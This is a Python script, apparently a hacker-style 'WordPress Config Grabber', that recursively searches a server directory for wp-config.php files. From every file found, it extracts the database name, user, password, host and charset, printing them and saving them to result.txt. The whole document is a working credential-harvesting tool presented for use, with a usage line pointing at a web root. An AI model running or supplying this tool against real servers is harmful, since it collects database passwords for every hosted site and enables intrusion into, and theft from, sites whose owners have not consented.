#!/usr/bin/env python
import os
import re
import argparse # Coded By JavaX7
import codecs  # Use? : python3 db.py /var/www/html

def find_wp_config_files(directory):
    """Recursively find all wp-config.php files in directory"""
    config_files = []
    for root, dirs, files in os.walk(directory):
        for filename in files:
            if filename == 'wp-config.php':
                config_files.append(os.path.join(root, filename))
    return config_files

def extract_db_details(file_path):
    """Extract database details from wp-config.php file"""
    details = ["File: " + file_path]
    try:
        with codecs.open(file_path, 'r', encoding='utf-8', errors='replace') as f:
            content = f.read()
        
        pattern = r"define\(\s*['\"]DB_(NAME|USER|PASSWORD|HOST|CHARSET|COLLATE)['\"]\s*,\s*['\"](.*?)['\"]\s*\);"
        matches = re.findall(pattern, content)
        
        for match in matches:
            details.append("⚡( '" + match[0] + "', '" + match[1] + "' );")
            
    except Exception as e:
        details.append("Error reading file: " + str(e))
    
    return '\n'.join(details)

def main():
    parser = argparse.ArgumentParser(description='WordPress Config Grabber Tool')
    parser.add_argument('directory', help='Directory path to search for wp-config.php files')
    parser.add_argument('--output', '-o', default='result.txt', 
                      help='Output file name (default: result.txt)')
    args = parser.parse_args()

    if not os.path.isdir(args.directory):
        print("Error: Invalid or non-existent directory - " + args.directory)
        return

    config_files = find_wp_config_files(args.directory)

    if not config_files:
        print("No wp-config.php files found in " + args.directory)
        return

    with codecs.open(args.output, 'w', encoding='utf-8') as out_file:
        print("\nDatabase Configurations Found in " + args.directory + ":")
        for config_file in config_files:
            db_details = extract_db_details(config_file)
            print("\n" + db_details)
            out_file.write(db_details + "\n\n")

    print("\nResults saved in " + args.output)

if __name__ == "__main__":
    main()
